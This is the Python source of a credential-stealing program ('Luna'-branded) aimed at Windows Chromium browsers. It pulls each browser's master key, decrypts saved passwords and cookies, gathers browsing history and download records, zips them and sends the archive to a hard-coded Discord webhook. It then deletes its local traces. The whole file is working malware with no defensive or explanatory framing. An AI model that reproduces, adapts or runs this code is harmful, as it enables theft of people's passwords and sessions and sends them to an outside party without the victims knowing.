import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
from zipfile import ZipFile

from Crypto.Cipher import AES
from discord import SyncWebhook, Embed, File
from win32crypt import CryptUnprotectData


class DataExtractor:
    def __init__(self, webhook_url):
        # Initialize the Webhook URL
        self.webhook = SyncWebhook.from_url(webhook_url)
        self.logins = []
        self.cookies = []
        self.web_history = []
        self.downloads = []
        self.cards = []

    def extract_data(self):
        # Initialize Chromium data extraction
        chromium = Chromium(self)
        chromium.extract_data_from_browsers()

    def send_data_to_webhook(self):
        # Create files from extracted data
        self.write_files()
        # Send data to Webhook
        self.send_to_webhook()
        # Clean up after sending
        self.clean_up()

    def write_files(self):
        # Create a directory for files
        os.makedirs("vault", exist_ok=True)
        if self.logins:
            with open("vault/logins.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in self.logins))
        if self.cookies:
            with open("vault/cookies.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in self.cookies))
        if self.web_history:
            with open("vault/web_history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in self.web_history))
        if self.downloads:
            with open("vault/downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in self.downloads))
        if self.cards:
            with open("vault/cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in self.cards))

        # Create zip archive
        with ZipFile("vault.zip", "w") as zip:
            for file in os.listdir("vault"):
                zip.write(f"vault/{file}", file)

    def send_to_webhook(self):
        # Send the data to Discord Webhook
        self.webhook.send(
            embed=Embed(
                title="Vault",
                description="```" + '\n'.join(self.tree(Path("vault"))) + "```",
            ),
            file=File("vault.zip"),
            username="Luna",
            avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
        )

    def clean_up(self):
        # Clean up files after sending data
        shutil.rmtree("vault")
        os.remove("vault.zip")

    def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
        pipes = {
            'space':  '    ',
            'branch': '│   ',
            'tee':    '├── ',
            'last':   '└── ',
        }

        if prefix == '':
            yield midfix_folder + path.name

        contents = list(path.iterdir())
        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from self.tree(path, prefix=prefix+extension)
            else:
                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"


class Chromium:
    def __init__(self, data_extractor):
        self.data_extractor = data_extractor
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }
        self.profiles = [
            'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5',
        ]
        self.master_key = None

    def extract_data_from_browsers(self):
        # Extract data from supported browsers
        for _, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            for profile in self.profiles:
                if not os.path.exists(path + '\\' + profile):
                    continue

                self.get_login_data(path, profile)
                self.get_cookies(path, profile)
                self.get_web_history(path, profile)
                self.get_downloads(path, profile)

    def get_master_key(self, path: str) -> bytes:
        if not os.path.exists(path):
            return None

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(self.master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def get_login_data(self, path: str, profile: str):
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return

        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            if row[0] and row[1] and row[2]:
                password = self.decrypt_password(row[2])
                self.data_extractor.logins.append(f'{row[0]}\t{row[1]}\t{password}')
        conn.close()
        os.remove('login_db')

    def get_cookies(self, path: str, profile: str):
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return

        shutil.copy(cookie_db, 'cookie_db')
        conn = sqlite3.connect('cookie_db')
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, path, encrypted_value FROM cookies')
        for row in cursor.fetchall():
            if row[0] and row[1] and row[2] and row[3]:
                cookie = self.decrypt_password(row[3])
                self.data_extractor.cookies.append(f'{row[0]}\t{row[1]}\t{row[2]}\t{cookie}')
        conn.close()
        os.remove('cookie_db')

    def get_web_history(self, path: str, profile: str):
        web_history_db = f'{path}\\{profile}\\History'
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if row[0] and row[1]:
                self.data_extractor.web_history.append(f'{row[0]}\t{row[1]}')
        conn.close()
        os.remove('web_history_db')

    def get_downloads(self, path: str, profile: str):
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if row[0] and row[1]:
                self.data_extractor.downloads.append(f'{row[0]}\t{row[1]}')
        conn.close()
        os.remove('downloads_db')


def main(webhook_url):
    extractor = DataExtractor(webhook_url)
    extractor.extract_data()
    extractor.send_data_to_webhook()

if __name__ == "__main__":
    main("https://discord.com/api/webhooks/1205108171769905202/-nPkymxlUmsdjFWCRXHDpjWO6opbKHQ8aHaevZFju-5xxswy5yReNuJSLQdLpnK7aKki")